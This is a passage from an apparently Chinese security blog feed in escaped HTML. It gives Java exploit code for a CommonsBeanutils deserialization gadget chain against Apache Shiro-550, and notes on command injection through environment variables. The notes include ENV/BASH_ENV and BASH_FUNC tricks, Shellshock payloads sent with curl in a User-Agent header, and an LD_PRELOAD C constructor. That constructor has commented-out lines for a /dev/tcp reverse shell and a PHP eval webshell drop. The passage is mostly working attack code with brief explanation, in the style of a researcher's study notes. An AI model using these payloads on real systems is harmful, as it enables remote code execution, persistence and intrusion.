&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// stub data for replacement later
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;property&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;queue&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="shiro-550无cc">Shiro-550(无cc&lt;/h3>
&lt;p>shiro本身的依赖是有cb的，但是会因为serialVersionUID不符而报错，即使我们调对生成payload的本地依赖版本和目标环境一致也会出现cc依赖版本不对的情况，我们设想一条无依赖的Shiro反序列化利用链&lt;/p>
&lt;p>在BeanComparator的构造函数处，没有显式传入Comparator时默认使用cc中的ComparableComparator，替代类需要满足这样的条件：&lt;/p>
&lt;ul>
&lt;li>实现java.util.Comparator接口&lt;/li>
&lt;li>实现java.io.Serializable接口&lt;/li>
&lt;li>最好自带，兼容性强&lt;/li>
&lt;/ul>
&lt;p>我们找到了java.util.String中的内部私有类CaseInsesitiveComparator，它实现了Comparator和Serializable&lt;/p>
&lt;p>替换exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.beanutils.BeanComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsBeanutils1Shiro&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">clazzBytes&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">clazzBytes&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">CASE_INSENSITIVE_ORDER&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// stub data for replacement later
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;property&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;queue&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ==================
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 生成序列化字符串
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>环境变量相关问题</title><link>https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/</link><pubDate>Wed, 23 Mar 2022 18:33:39 +0800</pubDate><guid>https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/</guid><description>&lt;h2 id="普通环境变量">普通环境变量&lt;/h2>
&lt;p>&lt;a href="https://tttang.com/archive/1450/">我是如何利用环境变量注入执行任意命令&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ENV&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;$(id 1&amp;gt;&amp;amp;2)&amp;#39;&lt;/span> dash -i -c &lt;span style="color:#d88200">&amp;#39;echo hello&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">BASH_ENV&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;$(id 1&amp;gt;&amp;amp;2)&amp;#39;&lt;/span> bash -c &lt;span style="color:#d88200">&amp;#39;echo hello&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ENV&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;$(id 1&amp;gt;&amp;amp;2)&amp;#39;&lt;/span> sh -i -c &lt;span style="color:#d88200">&amp;#34;echo hello&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PROMPT_COMMAND&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span> bash &lt;span style="color:#75715e"># 执行命令后给出交互shell debian无&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env &lt;span style="color:#d88200">$&amp;#39;BASH_FUNC_echo%%=() { id; }&amp;#39;&lt;/span> bash -c &lt;span style="color:#d88200">&amp;#39;echo hello&amp;#39;&lt;/span> &lt;span style="color:#75715e"># bash 4.4及以后&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>env &lt;span style="color:#d88200">$&amp;#39;BASH_FUNC_echo()=() { id; }&amp;#39;&lt;/span> bash -c &lt;span style="color:#d88200">&amp;#34;echo hello&amp;#34;&lt;/span> &lt;span style="color:#75715e"># bash 4.4以前&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="shellshock--cve-2014-6271">ShellShock / CVE-2014-6271&lt;/h3>
&lt;p>&lt;a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">ShellShock漏洞回顾与分析测试&lt;/a> | &lt;a href="https://github.com/vulhub/vulhub/blob/master/bash/shellshock/README.zh-cn.md">复现 - vulhub&lt;/a>&lt;/p>
&lt;p>应用于bash 4.3及以前&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ env &lt;span style="color:#111">TEST&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;() { :; };&amp;#39;&lt;/span> id&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ env &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;() { :;}; echo vulnerable&amp;#39;&lt;/span> bash -c &lt;span style="color:#d88200">&amp;#34;echo this is a test &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323180512946.png" alt="image-20220323180512946">&lt;/p>
&lt;p>对于vulhub的环境，还可以在UA头注入&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl -H &lt;span style="color:#d88200">&amp;#39;User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id&amp;#39;&lt;/span> http://127.0.0.1:8080/victim.cgi -i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323181632204.png" alt="image-20220323181632204">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323181715322.png" alt="image-20220323181715322">&lt;/p>
&lt;p>对于当时的各大web服务来说影响相当广泛，只要是运行CGI相关服务的系统都存在被利用的可能（因为会在底层调用bash），比如&lt;/p>
&lt;ul>
&lt;li>运行CGI脚本（通过mod_cgi 和 mod_cgid）的Apache HTTP 服务器；&lt;/li>
&lt;li>某些DHCP客户端；&lt;/li>
&lt;li>使用Bash的各种网络服务；&lt;/li>
&lt;li>使用ForceCommand功能的 OpenSSH 服务器；&lt;/li>
&lt;li>使用CGI作为网络接口的基于Linux的路由器；&lt;/li>
&lt;li>使用bash的各种嵌入式设备。&lt;/li>
&lt;li>……&lt;/li>
&lt;/ul>
&lt;h2 id="ld_preload">LD_PRELOAD&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ls / &amp;gt; /var/www/html/look&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// system(&amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// system(&amp;#34;echo \&amp;#34;&amp;lt;?php eval(\\$_POST[cmd]);?&amp;gt;\&amp;#34; &amp;gt; /var/www/html/ame.php&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>
